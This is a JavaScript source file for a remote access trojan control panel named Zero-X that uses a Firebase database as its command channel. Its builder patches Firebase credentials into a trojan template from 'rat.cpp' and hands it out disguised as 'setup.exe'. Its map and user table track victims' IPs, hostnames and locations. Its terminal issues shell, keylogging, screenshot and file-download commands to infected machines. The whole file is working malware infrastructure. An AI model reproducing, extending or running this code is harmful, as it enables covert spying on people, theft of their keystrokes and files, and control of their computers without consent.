// ─────────────────────────────────────────────────────────────────────────────
//  Zero-X  ·  dashboard.js
//  Backend: Firebase Realtime Database (REST — no SDK required)
//  All GitHub Issues code removed.
// ─────────────────────────────────────────────────────────────────────────────

// ── Icons ─────────────────────────────────────────────────────────────────────
const ICONS = {
  overview: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>`,
  profile:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="3.5"/><path d="M4.5 20c1.6-3.6 4.5-5.5 7.5-5.5s5.9 1.9 7.5 5.5"/></svg>`,
  automation:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M13 2 4 14h6l-1 8 9-12h-6l1-8Z" stroke-linejoin="round"/></svg>`,
  builder:  `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14.7 6.3a4 4 0 0 1-5.34 5.34L4 17l3 3 5.36-5.36a4 4 0 0 1 5.34-5.34L21 6l-3-3-3.3 3.3Z" stroke-linejoin="round" stroke-linecap="round"/></svg>`,
  logs:     `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 3h9l4 4v14H6z"/><path d="M15 3v4h4M9 12h7M9 16h7M9 8h3"/></svg>`,
  settings: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M19.4 13a7.97 7.97 0 0 0 0-2l2-1.5-2-3.4-2.4.7a8.06 8.06 0 0 0-1.7-1L15 3h-4l-.3 2.4a8.06 8.06 0 0 0-1.7 1l-2.4-.7-2 3.4L6.6 11a7.97 7.97 0 0 0 0 2l-2 1.5 2 3.4 2.4-.7a8.06 8.06 0 0 0 1.7 1L11 21h4l.3-2.4a8.06 8.06 0 0 0 1.7-1l2.4.7 2-3.4-2-1.6Z"/></svg>`,
  logout:   `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5M21 12H9"/></svg>`,
  users:    `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>`,
  terminal: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>`,
  features: `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>`,
  "discord-mark": `<svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 0 0-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 0 0-5.487 0 12.36 12.36 0 0 0-.617-1.23A.077.077 0 0 0 8.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 0 0-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 0 0 .031.055 20.03 20.03 0 0 0 5.993 2.98.078.078 0 0 0 .084-.026 13.83 13.83 0 0 0 1.226-1.963.074.074 0 0 0-.041-.104 13.201 13.201 0 0 1-1.872-.878.075.075 0 0 1-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 0 1 .078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 0 1 .079.009c.12.098.246.195.373.288a.075.075 0 0 1-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 0 0-.04.105c.36.687.772 1.341 1.225 1.962a.077.077 0 0 0 .084.028 19.963 19.963 0 0 0 6.002-2.981.076.076 0 0 0 .032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 0 0-.031-.028Z"/></svg>`,
};

// ── State ─────────────────────────────────────────────────────────────────────
let profile   = { username: "", handle: "", avatar: "", id: "" };
let FB        = { url: "", secret: "" };      // Firebase config
let mapRef    = null;                          // Leaflet map instance
let mapMarkers = {};                           // clientId → Leaflet marker
let mapRefreshTimer = null;
let termSelectedClient = null;
let termPollTimer      = null;
let termLastCmdId      = null;
let activityLog        = [];

// ── Helpers ───────────────────────────────────────────────────────────────────
function $(id)            { return document.getElementById(id); }
function setText(id, v)   { const e=$(id); if(e) e.textContent=v; }
function setSrc(id, v)    { const e=$(id); if(e) e.src=v; }

function showToast(msg) {
  const t = $("toast");
  if (!t) return;
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => t.classList.remove("show"), 2000);
}

function clientStatus(client) {
  const age = Date.now() - (client.last_seen || 0);
  if (age < 30000)  return "online";
  if (age < 300000) return "idle";
  return "offline";
}

function fmtAge(ts) {
  if (!ts) return "never";
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60)  return s + "s ago";
  if (s < 3600) return Math.floor(s/60) + "m ago";
  return Math.floor(s/3600) + "h ago";
}

function pushLog(msg) {
  const now = new Date().toLocaleTimeString();
  activityLog.unshift(`[${now}]  ${msg}`);
  if (activityLog.length > 200) activityLog.length = 200;
  const el = $("log-output");
  if (el) el.textContent = activityLog.join("\n");
}

// ── Firebase REST ─────────────────────────────────────────────────────────────
function loadFBConfig() {
  const saved = localStorage.getItem("zx_fb");
  if (saved) {
    try { FB = JSON.parse(saved); } catch(e) {}
  }
  // Also try config.js values if localStorage is empty
  if (!FB.url && typeof FIREBASE_CONFIG !== "undefined") {
    if (FIREBASE_CONFIG.dbUrl)  FB.url    = FIREBASE_CONFIG.dbUrl;
    if (FIREBASE_CONFIG.secret) FB.secret = FIREBASE_CONFIG.secret;
  }
}

function fbReady() {
  return FB.url && FB.secret;
}

async function fbGet(path) {
  if (!fbReady()) return null;
  const base = FB.url.replace(/\/$/, "");
  const res = await fetch(`${base}${path}.json?auth=${FB.secret}`);
  if (!res.ok) return null;
  return res.json();
}

async function fbPut(path, data) {
  if (!fbReady()) return false;
  const base = FB.url.replace(/\/$/, "");
  const res = await fetch(`${base}${path}.json?auth=${FB.secret}`, {
    method: "PUT",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
  return res.ok;
}

async function fbPatch(path, data) {
  if (!fbReady()) return false;
  const base = FB.url.replace(/\/$/, "");
  const res = await fetch(`${base}${path}.json?auth=${FB.secret}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
  return res.ok;
}

async function fbDelete(path) {
  if (!fbReady()) return false;
  const base = FB.url.replace(/\/$/, "");
  const res = await fetch(`${base}${path}.json?auth=${FB.secret}`, {
    method: "DELETE",
  });
  return res.ok;
}

// ── Profile ───────────────────────────────────────────────────────────────────
function loadProfile() {
  const params = new URLSearchParams(window.location.search);
  const username = params.get("username");
  if (!username) {
    const saved = localStorage.getItem("zx_profile");
    if (saved) {
      try { profile = JSON.parse(saved); renderProfile(); return; } catch(e) {}
    }
    window.location.href = "index.html";
    return;
  }
  profile = {
    username,
    handle: params.get("handle") || username,
    avatar: params.get("avatar") || "https://cdn.discordapp.com/embed/avatars/0.png",
    id:     params.get("id") || "—",
  };
  localStorage.setItem("zx_profile", JSON.stringify(profile));
  renderProfile();

  // Store owner discord id in Firebase so agents can verify
  if (fbReady() && profile.id && profile.id !== "—") {
    fbPatch("/owner", { discord_id: profile.id, username: profile.username })
      .catch(() => {});
  }
}

function renderProfile() {
  setSrc("chip-avatar",     profile.avatar);
  setText("chip-name",      profile.username);
  setText("chip-tag",       "@" + profile.handle);
  setText("hello-name",     "Welcome back, " + profile.username);
  setSrc("account-avatar",  profile.avatar);
  setText("account-name",   profile.username);
  setText("account-handle", "@" + profile.handle);
  setText("account-id",     profile.id);
}

// ── Icons ─────────────────────────────────────────────────────────────────────
function applyIcons() {
  document.querySelectorAll("[data-icon]").forEach(el => {
    el.innerHTML = ICONS[el.dataset.icon] || "";
  });
}

// ── Nav ───────────────────────────────────────────────────────────────────────
function wireNav() {
  const items = document.querySelectorAll(".nav-item[data-target]");
  items.forEach(item => {
    item.addEventListener("click", () => {
      items.forEach(i => i.classList.remove("active"));
      item.classList.add("active");
      document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
      const panel = $("panel-" + item.dataset.target);
      if (panel) panel.classList.add("active");
      const label = item.querySelector("span:last-child");
      if (label) setText("panel-title", label.textContent);

      const t = item.dataset.target;
      if (t === "dashboard") {
        setTimeout(() => mapRef && mapRef.invalidateSize(), 80);
        if (fbReady()) loadMapClients();
      }
      if (t === "users")   loadUsers();
      if (t === "terminal") loadTerminalClients();
      if (t === "builder") updateBuilderStatus();
    });
  });
}

// ── General buttons ───────────────────────────────────────────────────────────
function wireButtons() {
  const logout = id => {
    localStorage.removeItem("zx_profile");
    window.location.href = "index.html";
  };
  [$("logout-item"), $("account-logout-btn")].forEach(el => {
    if (el) el.addEventListener("click", logout);
  });

  const copyBtn = $("copy-id-btn");
  if (copyBtn) {
    copyBtn.addEventListener("click", async () => {
      try { await navigator.clipboard.writeText(profile.id); showToast("Copied ID"); }
      catch { showToast("Copy manually"); }
    });
  }

  const applyBtn = $("nickname-apply");
  if (applyBtn) {
    applyBtn.addEventListener("click", () => {
      const v = ($("nickname-input") || {}).value?.trim();
      if (!v) { showToast("Type a name first"); return; }
      profile.username = v;
      renderProfile();
      showToast("Name updated");
    });
  }

  const logsClear = $("logs-clear-btn");
  if (logsClear) {
    logsClear.addEventListener("click", () => {
      activityLog = [];
      const el = $("log-output");
      if (el) el.textContent = "Logs cleared.";
    });
  }
}

// ── Settings ──────────────────────────────────────────────────────────────────
function wireSettings() {
  document.querySelectorAll(".swatch").forEach(sw => {
    sw.addEventListener("click", () => {
      document.querySelectorAll(".swatch").forEach(s => s.classList.remove("selected"));
      sw.classList.add("selected");
      document.documentElement.style.setProperty("--violet", sw.dataset.color);
      document.documentElement.style.setProperty("--violet-soft", sw.dataset.color + "24");
      showToast("Accent updated");
    });
  });

  const compact = $("toggle-compact");
  if (compact) compact.addEventListener("click", () => {
    compact.classList.toggle("on");
    ($("sidebar") || {}).classList?.toggle("compact");
  });

  const motion = $("toggle-motion");
  if (motion) motion.addEventListener("click", () => {
    motion.classList.toggle("on");
    document.body.classList.toggle("motion-off");
  });
}

// ── Builder ───────────────────────────────────────────────────────────────────
function wireBuilder() {
  const urlIn    = $("fb-url-input");
  const secretIn = $("fb-secret-input");
  if (urlIn    && FB.url)    urlIn.value    = FB.url;
  if (secretIn && FB.secret) secretIn.value = FB.secret;

  // Refresh the "ready" indicator on load
  updateBuilderStatus();

  const fbSave = $("fb-save-btn");
  if (fbSave) {
    fbSave.addEventListener("click", () => {
      const url = (urlIn?.value || "").trim().replace(/\/$/, "");
      const sec = (secretIn?.value || "").trim();
      if (!url || !sec) { showToast("Fill in both fields"); return; }
      FB = { url, secret: sec };
      localStorage.setItem("zx_fb", JSON.stringify(FB));
      showToast("Firebase config saved ✓");
      updateBuilderStatus();
      if (profile.id && profile.id !== "—")
        fbPatch("/owner", { discord_id: profile.id, username: profile.username });
    });
  }

  const fbTest = $("fb-test-btn");
  if (fbTest) {
    fbTest.addEventListener("click", async () => {
      if (!fbReady()) { showToast("Save your config first"); return; }
      fbTest.disabled = true; fbTest.textContent = "Testing…";
      try {
        const res = await fbGet("/owner");
        showToast(res !== null ? "Connection good ✓" : "Connected — empty DB (normal)");
        addBuildLine("[firebase] connection OK", "ok");
        updateBuilderStatus();
      } catch(e) {
        showToast("Connection failed — check URL / secret");
        addBuildLine("[firebase] FAILED: " + e.message, "done");
      } finally {
        fbTest.disabled = false; fbTest.textContent = "Test Connection";
      }
    });
  }

  // ── Patching helpers ──────────────────────────────────────────────────────
  function encodeUtf16LE(str) {
    const b = new Uint8Array(str.length * 2);
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      b[i*2] = c & 0xff; b[i*2+1] = (c >> 8) & 0xff;
    }
    return b;
  }

  function findBytes(hay, needle) {
    outer: for (let i = 0; i <= hay.length - needle.length; i++) {
      for (let j = 0; j < needle.length; j++) {
        if (hay[i+j] !== needle[j]) continue outer;
      }
      return i;
    }
    return -1;
  }

  function patchSlot(bytes, markerChar, slotChars, value) {
    const needle = encodeUtf16LE(markerChar.repeat(slotChars));
    const offset = findBytes(bytes, needle);
    if (offset === -1) return false;
    const safe = value.slice(0, slotChars - 1);
    const slot = new Uint8Array(slotChars * 2);
    slot.set(encodeUtf16LE(safe), 0);
    bytes.set(slot, offset);
    return true;
  }

  function sanitizeName(raw) {
    let n = (raw || "setup.exe").trim().replace(/[\\/:*?"<>|]/g, "_");
    if (!n) n = "setup.exe";
    if (!/\.exe$/i.test(n)) n += ".exe";
    return n;
  }

  // ── Single generate-and-download button ──────────────────────────────────
  const genBtn   = $("builder-gen-btn");
  const nameInput = $("builder-name");
  if (!genBtn) return;

  genBtn.addEventListener("click", async () => {
    if (!fbReady()) {
      addBuildLine("ERROR: Save your Firebase config above first.", "done");
      showToast("Configure Firebase first"); return;
    }

    const chosenName = sanitizeName(nameInput?.value);
    genBtn.disabled  = true;
    genBtn.textContent = "Generating…";
    const log = $("build-log");
    if (log) log.innerHTML = "";

    const steps = [
      "[agent] fetching template binary…",
      "[patch] injecting Firebase endpoint…",
      "[patch] injecting auth token…",
      "[patch] injecting owner Discord ID…",
      `[done]  ${chosenName} is ready`,
    ];

    // Animate log lines while we work
    let stepIdx = 0;
    const logTimer = setInterval(() => {
      if (stepIdx < steps.length - 1) {
        addBuildLine(steps[stepIdx++], "ok");
      }
    }, 320);

    try {
      const res = await fetch("template.exe");
      if (!res.ok) throw new Error(
        "template.exe not found (HTTP " + res.status + "). " +
        "Push rat.cpp to GitHub — Actions will build it automatically."
      );

      const buf   = await res.arrayBuffer();
      const bytes = new Uint8Array(buf);

      // Slot 'F' × 128 = Firebase hostname
      const hostname = FB.url.replace(/^https?:\/\//, "").replace(/\/$/, "");
      const fbOk     = patchSlot(bytes, "F", 128, hostname);

      // Slot 'T' × 80 = Firebase database secret
      const tokOk = patchSlot(bytes, "T", 80, FB.secret);

      // Slot 'D' × 32 = Owner Discord ID (optional auth gate)
      const idOk = patchSlot(bytes, "D", 32, profile.id || "");

      clearInterval(logTimer);

      if (!fbOk || !tokOk) {
        addBuildLine("ERROR: patch failed — make sure template.exe was built from rat.cpp", "done");
        showToast("Patch failed"); genBtn.disabled = false; genBtn.textContent = "Generate & Download EXE";
        return;
      }
      if (!idOk) addBuildLine("WARN: owner ID slot missing — Discord ID check disabled.", "ok");

      addBuildLine(steps[steps.length - 1], "done");

      const blob = new Blob([bytes], { type: "application/octet-stream" });
      const url  = URL.createObjectURL(blob);
      const a    = document.createElement("a");
      a.href = url; a.download = chosenName;
      document.body.appendChild(a); a.click(); a.remove();
      URL.revokeObjectURL(url);

      showToast(`↓ ${chosenName}`);
      pushLog(`Generated and downloaded: ${chosenName} (connected to ${FB.url})`);
    } catch(err) {
      clearInterval(logTimer);
      addBuildLine("ERROR: " + err.message, "done");
      showToast("Failed: " + err.message.slice(0, 60));
    } finally {
      genBtn.disabled    = false;
      genBtn.textContent = "Generate & Download EXE";
    }
  });
}

// Shows a green/red status chip in the builder based on whether Firebase is configured
async function updateBuilderStatus() {
  const chip = $("builder-status-chip");
  if (!chip) return;
  if (!fbReady()) {
    chip.textContent  = "● Firebase not configured";
    chip.style.color  = "#ff6b6b";
    return;
  }
  // Check template.exe exists
  chip.textContent = "● Checking…"; chip.style.color = "#7b8094";
  try {
    const r = await fetch("template.exe", { method: "HEAD" });
    if (r.ok) {
      chip.textContent = "● Ready — Firebase configured, template.exe found";
      chip.style.color = "#4dff88";
    } else {
      chip.textContent = "● Firebase OK — template.exe missing (push rat.cpp to trigger build)";
      chip.style.color = "#ffb84d";
    }
  } catch {
    chip.textContent = "● Firebase OK — could not check template.exe";
    chip.style.color = "#ffb84d";
  }
}

function addBuildLine(text, cls) {
  const log  = $("build-log");
  if (!log) return;
  const line = document.createElement("div");
  line.className = "build-log-line" + (cls ? " " + cls : "");
  line.textContent = text;
  log.appendChild(line);
  log.scrollTop = log.scrollHeight;
}

// ── Map ───────────────────────────────────────────────────────────────────────
function initMap() {
  const mapEl = $("map-leaflet");
  if (!mapEl || typeof L === "undefined") return;

  mapRef = L.map(mapEl, {
    center: [20, 0], zoom: 2, minZoom: 2,
    zoomControl: false, attributionControl: true, worldCopyJump: true,
  });
  setTimeout(() => mapRef.invalidateSize(), 100);

  L.tileLayer("https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png", {
    attribution: "© OpenStreetMap © CARTO",
    subdomains: "abcd", maxZoom: 19,
  }).addTo(mapRef);

  [$("map-zoom-in"),  $("map-zoom-out"),  $("map-reset")].forEach((btn, i) => {
    if (btn) btn.addEventListener("click", () => {
      if (i === 0) mapRef.zoomIn();
      else if (i === 1) mapRef.zoomOut();
      else mapRef.setView([20, 0], 2, { animate: true });
    });
  });

  if (fbReady()) loadMapClients();

  // Auto-refresh every 30 seconds while dashboard panel is visible
  mapRefreshTimer = setInterval(() => {
    if (document.getElementById("panel-dashboard")?.classList.contains("active")) {
      if (fbReady()) loadMapClients();
    }
  }, 30000);
}

function makeMarkerIcon(status) {
  const colors = { online: "#4dff88", idle: "#ffb84d", offline: "#7b8094" };
  const c = colors[status] || "#7b8094";
  return L.divIcon({
    className: "",
    html: `<svg xmlns="http://www.w3.org/2000/svg" width="28" height="38" viewBox="0 0 28 38">
      <path fill="${c}" stroke="#fff" stroke-width="1.5" d="M14 1C7.4 1 2 6.4 2 13c0 8 12 24 12 24s12-16 12-24C26 6.4 20.6 1 14 1z"/>
      <circle fill="#fff" cx="14" cy="13" r="5"/>
    </svg>`,
    iconSize: [28, 38], iconAnchor: [14, 38], popupAnchor: [0, -40],
  });
}

async function loadMapClients() {
  if (!fbReady() || !mapRef) return;
  try {
    const clients = await fbGet("/clients");
    // Clear old markers
    Object.values(mapMarkers).forEach(m => m.remove());
    mapMarkers = {};

    if (!clients) {
      updateDashStats(0, 0, 0);
      return;
    }

    let total = 0, online = 0;
    const countries = new Set();

    Object.entries(clients).forEach(([id, c]) => {
      if (!c.lat || !c.lon) return;
      total++;
      const status = clientStatus(c);
      if (status === "online") online++;
      if (c.country) countries.add(c.country);

      const marker = L.marker([c.lat, c.lon], { icon: makeMarkerIcon(status) }).addTo(mapRef);
      marker.bindPopup(`
        <div style="background:#0d1017;color:#e7e9f3;padding:12px 14px;border-radius:8px;
          font-family:'JetBrains Mono',monospace;font-size:12px;min-width:200px;">
          <div style="color:${status==="online"?"#4dff88":status==="idle"?"#ffb84d":"#7b8094"};
            font-weight:700;font-size:13px;margin-bottom:6px;">
            ${c.ip || "Unknown IP"}
            <span style="font-size:10px;margin-left:6px;font-weight:400;">${status}</span>
          </div>
          <div style="margin-bottom:3px;">${c.hostname || "—"} · ${c.os_user || "—"}</div>
          <div style="color:#4ce0d2;margin-bottom:3px;">${c.city || "—"}, ${c.country || "—"}</div>
          <div style="color:#7b8094;font-size:11px;margin-bottom:8px;">
            ${parseFloat(c.lat).toFixed(4)}, ${parseFloat(c.lon).toFixed(4)}
          </div>
          <div style="color:#7b8094;font-size:11px;">last seen: ${fmtAge(c.last_seen)}</div>
          <button onclick="openTerminal('${id}')"
            style="margin-top:8px;width:100%;padding:6px;background:#7c5cfc;border:none;
            border-radius:6px;color:#0a0c14;font-weight:700;font-family:'JetBrains Mono',monospace;
            font-size:11px;cursor:pointer;">Open Terminal</button>
        </div>
      `);
      mapMarkers[id] = marker;
    });

    updateDashStats(total, online, countries.size);
  } catch(e) {
    console.error("[map] load failed", e);
  }
}

function updateDashStats(total, online, countries) {
  setText("stat-total",     total);
  setText("stat-online",    online);
  setText("stat-countries", countries);
}

// ── Users ─────────────────────────────────────────────────────────────────────
function wireUsers() {
  const btn = $("users-refresh-btn");
  if (btn) btn.addEventListener("click", loadUsers);
}

async function loadUsers() {
  const wrap    = $("users-table-wrap");
  const countEl = $("users-count");
  if (!wrap) return;

  if (!fbReady()) {
    wrap.innerHTML = '<p style="color:#7b8094;">Configure Firebase in the Builder tab first.</p>';
    return;
  }

  wrap.innerHTML = '<p style="color:#7b8094;">Loading…</p>';
  try {
    const clients = await fbGet("/clients");
    if (!clients || Object.keys(clients).length === 0) {
      wrap.innerHTML = '<p style="color:#7b8094;">No clients yet — run the EXE first.</p>';
      if (countEl) countEl.textContent = "";
      return;
    }

    const entries = Object.entries(clients);
    if (countEl) countEl.textContent = "· " + entries.length + " user" + (entries.length !== 1 ? "s" : "");

    const table = document.createElement("table");
    table.className = "users-table";
    table.innerHTML = `<thead><tr>
      <th>#</th><th>Status</th><th>IP</th><th>Hostname</th>
      <th>User</th><th>City</th><th>Country</th><th>OS</th><th>Last Seen</th><th></th>
    </tr></thead><tbody id="users-tbody"></tbody>`;
    wrap.innerHTML = "";
    wrap.appendChild(table);
    const tbody = $("users-tbody");

    entries.forEach(([id, c], idx) => {
      const status = clientStatus(c);
      const tr = document.createElement("tr");
      tr.id = "user-row-" + id;
      tr.innerHTML = `
        <td style="color:#7b8094;">${idx+1}</td>
        <td><span class="badge ${status}">${status}</span></td>
        <td><code style="color:#4ce0d2;background:#0d1017;padding:2px 8px;border-radius:4px;">${c.ip||"—"}</code></td>
        <td style="color:#e7e9f3;">${c.hostname||"—"}</td>
        <td style="color:#7b8094;">${c.os_user||"—"}</td>
        <td>${c.city||"—"}</td>
        <td>${c.country||"—"}</td>
        <td style="color:#7b8094;font-size:12px;">${c.os_ver||"—"}</td>
        <td style="color:#7b8094;font-size:12px;">${fmtAge(c.last_seen)}</td>
        <td style="display:flex;gap:6px;padding:8px 12px;">
          <button class="btn sm cyan" data-term="${id}">Terminal</button>
          <button class="btn sm danger" data-remove="${id}">Remove</button>
        </td>`;
      tbody.appendChild(tr);

      tr.querySelector("[data-term]").addEventListener("click", () => openTerminal(id));
      tr.querySelector("[data-remove]").addEventListener("click", () => removeClient(id));
    });
  } catch(e) {
    wrap.innerHTML = '<p style="color:#ff4d6d;">Failed to load — check your Firebase config.</p>';
  }
}

async function removeClient(id) {
  const btn = document.querySelector(`[data-remove="${id}"]`);
  if (btn) { btn.disabled = true; btn.textContent = "…"; }
  const ok = await fbDelete("/clients/" + id);
  if (ok) {
    const row = $("user-row-" + id);
    if (row) row.remove();
    if (mapMarkers[id]) { mapMarkers[id].remove(); delete mapMarkers[id]; }
    showToast("Client removed");
    pushLog(`Removed client ${id}`);
  } else {
    showToast("Remove failed");
    if (btn) { btn.disabled = false; btn.textContent = "Remove"; }
  }
}

// ── Terminal ──────────────────────────────────────────────────────────────────
function wireTerminal() {
  const input   = $("term-input");
  const sendBtn = $("term-send-btn");
  const clearBtn = $("term-clear-btn");
  const sel     = $("term-client-select");
  const refresh  = $("term-refresh-clients");

  if (sel) sel.addEventListener("change", () => {
    termSelectedClient = sel.value || null;
    if (sendBtn) sendBtn.disabled = !termSelectedClient;
    if (termSelectedClient) {
      termAppendSys(`Connected to client: ${termSelectedClient}`);
      pushLog(`Terminal opened for ${termSelectedClient}`);
    }
  });

  if (refresh) refresh.addEventListener("click", loadTerminalClients);

  if (clearBtn) clearBtn.addEventListener("click", () => {
    const out = $("term-output");
    if (out) out.innerHTML = '<div class="line-sys">Terminal cleared.</div>';
  });

  if (sendBtn) sendBtn.addEventListener("click", termSend);
  if (input) input.addEventListener("keydown", e => {
    if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); termSend(); }
  });
}

async function loadTerminalClients() {
  const sel = $("term-client-select");
  if (!sel || !fbReady()) return;
  try {
    const clients = await fbGet("/clients");
    sel.innerHTML = '<option value="">— select a client —</option>';
    if (clients) {
      Object.entries(clients).forEach(([id, c]) => {
        const status = clientStatus(c);
        const opt = document.createElement("option");
        opt.value = id;
        opt.textContent = `[${status.toUpperCase()}] ${c.hostname||id} — ${c.ip||"?"} (${c.city||"?"}, ${c.country||"?"})`;
        sel.appendChild(opt);
      });
      // Re-select previous if still exists
      if (termSelectedClient && clients[termSelectedClient]) {
        sel.value = termSelectedClient;
      }
    }
  } catch(e) {}
}

async function termSend() {
  const input   = $("term-input");
  const sendBtn = $("term-send-btn");
  if (!termSelectedClient || !input) return;

  const cmd = input.value.trim();
  if (!cmd) return;

  input.value     = "";
  sendBtn.disabled = true;
  termAppendCmd(cmd);

  const cmdId = String(Date.now());
  const payload = { id: cmdId, type: "shell", payload: cmd, ts: Date.now() };

  // Route special types
  if (cmd.toLowerCase() === "screenshot") {
    payload.type = "screenshot"; payload.payload = "";
  } else if (cmd.toLowerCase() === "sysinfo") {
    payload.type = "sysinfo"; payload.payload = "";
  } else if (cmd.toLowerCase() === "keylog") {
    payload.type = "keylog"; payload.payload = "";
  } else if (cmd.toLowerCase() === "kill") {
    payload.type = "kill"; payload.payload = "";
  } else if (cmd.toLowerCase().startsWith("ps:")) {
    payload.type = "ps"; payload.payload = cmd.slice(3).trim();
  } else if (cmd.toLowerCase().startsWith("ls ") || cmd.toLowerCase() === "ls") {
    payload.type = "ls"; payload.payload = cmd.slice(3).trim() || "C:\\";
  } else if (cmd.toLowerCase().startsWith("download ")) {
    payload.type = "download"; payload.payload = cmd.slice(9).trim();
  } else if (cmd.toLowerCase().startsWith("ps list")) {
    payload.type = "pslist"; payload.payload = "";
  }

  const ok = await fbPut(`/clients/${termSelectedClient}/pending_cmd`, payload);
  if (!ok) {
    termAppendErr("Failed to send command — Firebase error");
    sendBtn.disabled = false;
    return;
  }

  termAppendSys("Command sent — waiting for response…");
  pushLog(`CMD → ${termSelectedClient}: ${cmd}`);
  termLastCmdId = cmdId;

  // Clear any previous result to avoid false match
  await fbPut(`/clients/${termSelectedClient}/cmd_result`, null);

  // Poll for result
  clearInterval(termPollTimer);
  let attempts = 0;
  termPollTimer = setInterval(async () => {
    attempts++;
    if (attempts > 60) { // 60 × 1s = 60 second timeout
      clearInterval(termPollTimer);
      termAppendErr("Timeout — no response from client");
      sendBtn.disabled = false;
      return;
    }
    try {
      const result = await fbGet(`/clients/${termSelectedClient}/cmd_result`);
      if (result && result.cmd_id === termLastCmdId) {
        clearInterval(termPollTimer);

        if (payload.type === "screenshot" && result.output) {
          // Render inline image
          termAppendScreenshot(result.output);
        } else {
          termAppendOut(result.output || "(no output)");
        }

        pushLog(`RESULT ← ${termSelectedClient}: ${(result.output||"").slice(0,80)}`);
        sendBtn.disabled = false;
      }
    } catch(e) {}
  }, 1000);
}

function termAppendCmd(text) {
  const out = $("term-output");
  if (!out) return;
  const d = document.createElement("div");
  d.className = "line-cmd"; d.textContent = text;
  out.appendChild(d); out.scrollTop = out.scrollHeight;
}
function termAppendOut(text) {
  const out = $("term-output");
  if (!out) return;
  const d = document.createElement("div");
  d.className = "line-out"; d.textContent = text;
  out.appendChild(d); out.scrollTop = out.scrollHeight;
}
function termAppendSys(text) {
  const out = $("term-output");
  if (!out) return;
  const d = document.createElement("div");
  d.className = "line-sys"; d.textContent = text;
  out.appendChild(d); out.scrollTop = out.scrollHeight;
}
function termAppendErr(text) {
  const out = $("term-output");
  if (!out) return;
  const d = document.createElement("div");
  d.className = "line-err"; d.textContent = text;
  out.appendChild(d); out.scrollTop = out.scrollHeight;
}
function termAppendScreenshot(b64) {
  const out = $("term-output");
  if (!out) return;
  const img = document.createElement("img");
  img.src = "data:image/bmp;base64," + b64;
  img.style.cssText = "max-width:100%;border-radius:6px;margin:8px 0;border:1px solid #232838;display:block;";
  out.appendChild(img); out.scrollTop = out.scrollHeight;
}

// ── Open terminal from map popup / users tab ──────────────────────────────────
window.openTerminal = function(clientId) {
  // Switch to terminal tab
  document.querySelectorAll(".nav-item[data-target]").forEach(i => {
    i.classList.toggle("active", i.dataset.target === "terminal");
  });
  document.querySelectorAll(".tab-panel").forEach(p => p.classList.remove("active"));
  const panel = $("panel-terminal");
  if (panel) panel.classList.add("active");
  setText("panel-title", "Terminal");

  // Pre-select client
  termSelectedClient = clientId;
  loadTerminalClients().then(() => {
    const sel = $("term-client-select");
    if (sel) sel.value = clientId;
    const sendBtn = $("term-send-btn");
    if (sendBtn) sendBtn.disabled = false;
    termAppendSys("Auto-selected: " + clientId);
  });
};

// ── Init ──────────────────────────────────────────────────────────────────────
function safeRun(fn, label) {
  try { fn(); } catch(e) { console.error(`[dashboard] ${label}:`, e); }
}

document.addEventListener("DOMContentLoaded", () => {
  safeRun(loadFBConfig,   "loadFBConfig");
  safeRun(applyIcons,     "applyIcons");
  safeRun(loadProfile,    "loadProfile");
  safeRun(wireNav,        "wireNav");
  safeRun(wireButtons,    "wireButtons");
  safeRun(wireSettings,   "wireSettings");
  safeRun(wireBuilder,    "wireBuilder");
  safeRun(wireUsers,      "wireUsers");
  safeRun(wireTerminal,   "wireTerminal");
  safeRun(initMap,        "initMap");
});
